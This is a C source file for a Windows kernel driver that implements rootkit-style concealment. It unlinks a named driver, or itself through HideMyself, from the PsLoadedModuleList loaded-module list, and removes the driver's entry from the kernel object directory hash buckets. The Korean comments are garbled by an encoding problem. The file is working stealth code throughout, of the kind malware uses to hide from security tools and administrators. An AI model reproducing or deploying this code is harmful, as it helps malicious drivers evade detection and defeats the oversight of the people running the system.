#include <ntifs.h>
#include <ntddk.h>
#include <wdm.h>
#include <ntimage.h>
#include <windef.h>
#include <ntstrsafe.h>
#include "hidedriver.h"
#include "define.h"
#include "undocumented.h"
#include "listentry.h"

extern PDRIVER_OBJECT g_pDriverObject;
PLDR_DATA_TABLE_ENTRY PsLoadedModuleList;

BOOLEAN HideDriverViaPsLoadedModuleList(PCWSTR szFileName)
{
	BOOLEAN Hide = FALSE;
	kprintf("===hide driver (PsLoadedModuleList traversing)===");
	PLDR_DATA_TABLE_ENTRY prevEntry, nextEntry, Entry;
	Entry = (PLDR_DATA_TABLE_ENTRY)PsLoadedModuleList->InLoadOrderLinks.Flink;

	//	int count = 0;

	while (Entry != PsLoadedModuleList)
	{
		//	kprintf("[%d] %p %ws %p", count++, Entry, Entry->FullDllName.Buffer, &Entry);
		if (0 == wcscmp((PCWSTR)Entry->FullDllName.Buffer, szFileName))
		{
			kprintf("found");
			prevEntry = (PLDR_DATA_TABLE_ENTRY)Entry->InLoadOrderLinks.Blink; // ���� ���
			nextEntry = (PLDR_DATA_TABLE_ENTRY)Entry->InLoadOrderLinks.Flink; // ���� ���
			prevEntry->InLoadOrderLinks.Flink = Entry->InLoadOrderLinks.Flink; // ���� ����� ������ �� �������� �ٲ�
			nextEntry->InLoadOrderLinks.Blink = Entry->InLoadOrderLinks.Blink; // ���� ����� ������ �� ������ �ٲ� 
			// �� ����� ��, �ڸ� �� �ڽ����� �ٲ�
			// �ٲ��� �ʴ´ٸ� ����̹� ���񽺸� stop�Ҷ� BSOD�߻� (KERNEL SECURITY CHECK FAILURE)
			Entry->InLoadOrderLinks.Flink = (PLIST_ENTRY)Entry;
			Entry->InLoadOrderLinks.Blink = (PLIST_ENTRY)Entry;
			Hide = TRUE;
			break;
		}

		Entry = (PLDR_DATA_TABLE_ENTRY)Entry->InLoadOrderLinks.Flink;
	}
	return Hide;
}


/* hide DRIVER_OBJECT
* service �̸��� DRIVER_OBJECT�� ��Ͽ��� ����
* "\\Driver" ���� ������Ʈ ��� ���ϴ°Ͱ� ������ ������
*/
BOOLEAN HideDriverFromObjectDirectory(PUNICODE_STRING pDriverName)
{
	kprintf("===hide driver (Object Directory Entry traversing)===");

	POBJECT_HEADER_NAME_INFO pObjectHeaderNameInfo;
	POBJECT_DIRECTORY pObjectDirectory;
		
	BOOLEAN bRet = FALSE;

	pObjectHeaderNameInfo = ObQueryNameInfo(g_pDriverObject);
	if (!MmIsAddressValid(pObjectHeaderNameInfo))
	{
		kprintf("ObQueryNameInfo occurs an error.\n");
		return FALSE;
	}
//	kprintf("name : %wZ\n", &pObjectHeaderNameInfo->Name);

	pObjectDirectory = pObjectHeaderNameInfo->Directory;

	int count;
	count = 0;
	for (int p = 0; p < 37; p++)
	{	
		POBJECT_DIRECTORY_ENTRY pBlinkObjectDirectoryEntry = NULL;
		POBJECT_DIRECTORY_ENTRY pObjectDirectoryEntry = pObjectDirectory->HashBuckets[p];
		
		// HashBuckets �� NULL �� ��쵵 ���� (��ǥ������ \FileSystem)
		if (!MmIsAddressValid(pObjectDirectoryEntry))
		{
			continue;	
		}
		while (pObjectDirectoryEntry)
		{
		
			if (!MmIsAddressValid(pObjectDirectoryEntry) ||
				!MmIsAddressValid(pObjectDirectoryEntry->Object))
			{
				bRet = FALSE;
				break;				
			}
			
			pObjectHeaderNameInfo = ObQueryNameInfo(pObjectDirectoryEntry->Object);
		
		
			if (RtlEqualUnicodeString(pDriverName, &pObjectHeaderNameInfo->Name, TRUE))
			{
				kprintf("pObjectDirectoryEntry : %p", pObjectDirectoryEntry);
				kprintf("[%d %d] >>> %wZ", p, count++, pObjectHeaderNameInfo->Name);
				// ü���� 0��°(=���)�� �ڽ��� Entry�϶�
				if (pObjectDirectory->HashBuckets[p] == pObjectDirectoryEntry)
				{
					kprintf("[Found] head node\n");
					pObjectDirectory->HashBuckets[p] = pObjectDirectoryEntry->ChainLink; // �ڽ�Entry�� ���� Entry�� ���� �����.
					pObjectDirectoryEntry->ChainLink = NULL;
				}
				else // 1��°����
				{
					kprintf("[Found] no head node\n");
					pBlinkObjectDirectoryEntry->ChainLink = pObjectDirectoryEntry->ChainLink; // ���� Entry�� ���� Entry�� �� ���� Entry�� ����Ų��.
					pObjectDirectoryEntry->ChainLink = NULL;
				}
				bRet = TRUE;
				goto EXIT;
			}			

			pBlinkObjectDirectoryEntry = pObjectDirectoryEntry; // 0�� �ƴ� n��° Entry���� ü���� ���������� ���
			pObjectDirectoryEntry = pObjectDirectoryEntry->ChainLink;

		}
	}
	kprintf("NOT FOUND!!!!!!!!!!!!!!!!!");
EXIT:
	return bRet;
}

VOID HideMyself()
{
	//KIRQL irql = KeRaiseIrqlToDpcLevel(); // ������ �� �ȵǸ� IRQL ���
	PLDR_DATA_TABLE_ENTRY currentEntry = (PLDR_DATA_TABLE_ENTRY)g_pDriverObject->DriverSection;
	PLDR_DATA_TABLE_ENTRY prevEntry, nextEntry;

	prevEntry = (PLDR_DATA_TABLE_ENTRY)currentEntry->InLoadOrderLinks.Blink; // ���� ���
	nextEntry = (PLDR_DATA_TABLE_ENTRY)currentEntry->InLoadOrderLinks.Flink; // ���� ���
	prevEntry->InLoadOrderLinks.Flink = currentEntry->InLoadOrderLinks.Flink; // ���� ����� ������ �� �������� �ٲ�
	nextEntry->InLoadOrderLinks.Blink = currentEntry->InLoadOrderLinks.Blink; // ���� ����� ������ �� ������ �ٲ� 

	// �� ����� ��, �ڸ� �� �ڽ����� �ٲ�
	// �ٲ��� �ʴ´ٸ� ����̹� ���񽺸� stop�Ҷ� BSOD�߻� (KERNEL SECURITY CHECK FAILURE)
	currentEntry->InLoadOrderLinks.Flink = (PLIST_ENTRY)currentEntry;
	currentEntry->InLoadOrderLinks.Blink = (PLIST_ENTRY)currentEntry;

	// KeLowerIrql(irql); 
}

BOOLEAN HideDriver(LPCWSTR pDriverPath, LPCWSTR pServiceName)
{
	UNICODE_STRING ServiceName;
	RtlInitUnicodeString(&ServiceName, pServiceName);
	UNICODE_STRING Empty = RTL_CONSTANT_STRING(L"");
	BOOLEAN bHide = FALSE;
	BOOLEAN bHide2 = FALSE;
	BOOLEAN bRet = FALSE;
	if (0 != wcscmp(pDriverPath, L""))
	{
		bHide = HideDriverViaPsLoadedModuleList(pDriverPath);
	}
	if (!RtlEqualUnicodeString(&Empty, &ServiceName, TRUE))
	{
		bHide2 = HideDriverFromObjectDirectory(&ServiceName);
	}

	if (TRUE == bHide || TRUE == bHide2)
	{
		bRet = TRUE;
	}
	else if (FALSE == bHide && FALSE == bHide2)
	{
		bRet = FALSE;
	}

	return bRet;
}